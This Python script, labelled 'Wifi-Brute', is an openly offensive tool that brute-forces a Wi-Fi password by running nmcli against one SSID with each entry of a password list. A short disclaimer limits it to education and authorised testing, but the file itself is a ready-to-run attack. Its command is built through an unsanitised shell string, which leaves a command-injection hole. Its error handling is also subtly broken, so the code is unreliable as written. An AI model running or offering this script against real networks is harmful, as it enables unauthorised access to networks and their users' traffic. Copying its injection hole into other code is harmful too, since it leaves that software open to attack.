#  _    _ _  __ _       ______            _       
# | |  | (_)/ _(_)      | ___ \          | |      
# | |  | |_| |_ _ ______| |_/ /_ __ _   _| |_ ___ 
# | |/\| | |  _| |______| ___ \ '__| | | | __/ _ \
# \  /\  / | | | |      | |_/ / |  | |_| | ||  __/
#  \/  \/|_|_| |_|      \____/|_|   \__,_|\__\___|
                                              
# This python script is for education purposes.
# It should only be used on devices you have permission to test.
# The script needs to be run as root to avoid gui pop up window.

import subprocess
from time import gmtime, strftime

def brute_force(ssid,psk):
    result = subprocess.check_output(f"nmcli dev wifi connect {ssid} password {psk}", shell=True)
    if ('successfully' in str(result)):
        print("Success! PSK: " + psk)
        exit()
    else:
        return("failed")

ssid = 'Link'

with open('passwords.txt') as password_list:
    for psk in password_list:
        psk = psk.strip()
        if (len(psk) > 7):
            time = strftime("%H:%M:%S", gmtime())
            print(time + ' Trying: ' + psk)
            response = brute_force(ssid,psk)
            time = strftime("%H:%M:%S", gmtime())
            print(time + ' ' + psk + ' ' + response)
